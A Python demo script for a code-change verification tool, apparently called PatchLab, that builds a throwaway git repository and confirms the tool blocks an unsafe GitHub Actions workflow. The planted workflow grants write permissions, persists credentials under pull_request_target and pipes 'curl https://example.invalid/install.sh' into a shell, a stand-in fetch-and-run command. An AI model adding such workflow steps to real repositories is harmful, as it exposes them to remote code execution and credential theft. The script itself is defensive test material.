#!/usr/bin/env python3
from __future__ import annotations

import argparse
from pathlib import Path
import shutil
import subprocess
import tempfile

from patchlab_commons.engine import VerificationEngine, VerificationRequest
from patchlab_commons.models import Outcome
from patchlab_commons.passport import verify_passport_bundle


CONFIG = """
[project]
name = "patchlab-blocked-workflow-demo"

[scope]
allow = ["**"]
deny = ["**/*.pem", "**/*.key", ".env"]
max_files = 20
max_added_lines = 500
max_deleted_lines = 500

[policy]
dependency_changes = "review"
workflow_changes = "review"
dangerous_permissions = "deny"
secret_exposure = "deny"
network_additions = "review"
test_weakening = "deny"
binary_files = "review"
generated_files = "review"
fail_on_review = false
require_clean_worktree = false
require_human_review = true
"""


def git(repo: Path, *args: str) -> str:
    process = subprocess.run(
        ["git", *args],
        cwd=repo,
        text=True,
        encoding="utf-8",
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False,
    )
    if process.returncode != 0:
        raise RuntimeError(process.stderr.strip())
    return process.stdout.strip()


def commit(repo: Path, message: str) -> str:
    git(repo, "add", "-A")
    git(repo, "commit", "-m", message)
    return git(repo, "rev-parse", "HEAD")


def build_attack_repo() -> tuple[Path, str, str]:
    repo = Path(tempfile.mkdtemp(prefix="patchlab-attack-repo-"))
    git(repo, "init", "-b", "main")
    git(repo, "config", "user.name", "PatchLab Demo")
    git(repo, "config", "user.email", "demo@patchlab.invalid")
    git(repo, "remote", "add", "origin", "https://github.com/patchlab/examples.git")
    workflow = repo / ".github" / "workflows" / "ci.yml"
    workflow.parent.mkdir(parents=True)
    workflow.write_text(
        "name: CI\non: [push]\npermissions:\n  contents: read\n",
        encoding="utf-8",
    )
    (repo / "patchlab.toml").write_text(CONFIG, encoding="utf-8")
    base = commit(repo, "add read-only workflow")

    workflow.write_text(
        """name: CI
on:
  pull_request_target:
permissions:
  contents: write
jobs:
  unsafe:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: true
      - run: curl https://example.invalid/install.sh | sh
""",
        encoding="utf-8",
    )
    head = commit(repo, "add unsafe privileged workflow")
    return repo, base, head


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", type=Path)
    args = parser.parse_args()

    repo, base, head = build_attack_repo()
    try:
        internal_output = repo / ".patchlab" / "blocked"
        result = VerificationEngine().verify(
            VerificationRequest(
                repository=repo,
                config_path=Path("patchlab.toml"),
                base_ref=base,
                head_ref=head,
                output_dir=internal_output,
            )
        )
        rule_ids = {finding.rule_id for finding in result.report.findings}
        expected = {
            "PL-GHA-002",
            "PL-GHA-003",
            "PL-GHA-004",
            "PL-GHA-006",
            "PL-GHA-007",
        }
        if result.report.outcome is not Outcome.FAIL or not expected.issubset(rule_ids):
            raise RuntimeError(
                "attack demo was not blocked as expected: "
                f"outcome={result.report.outcome}, rules={sorted(rule_ids)}"
            )

        valid, detail = verify_passport_bundle(result.artifacts["bundle"])
        if not valid:
            raise RuntimeError(f"blocked passport failed verification: {detail}")

        final_output = (
            args.output.resolve()
            if args.output
            else (Path.cwd() / ".patchlab" / "blocked-demo").resolve()
        )
        if final_output.exists():
            shutil.rmtree(final_output)
        shutil.copytree(internal_output, final_output)

        print("PatchLab attack demo completed")
        print(f"Outcome: {result.report.outcome.value}")
        print(f"Rules: {', '.join(sorted(rule_ids))}")
        print(f"Output: {final_output}")
        print(f"Bundle SHA-256: {result.artifacts['bundle_sha256']}")
        return 0
    finally:
        shutil.rmtree(repo, ignore_errors=True)


if __name__ == "__main__":
    raise SystemExit(main())
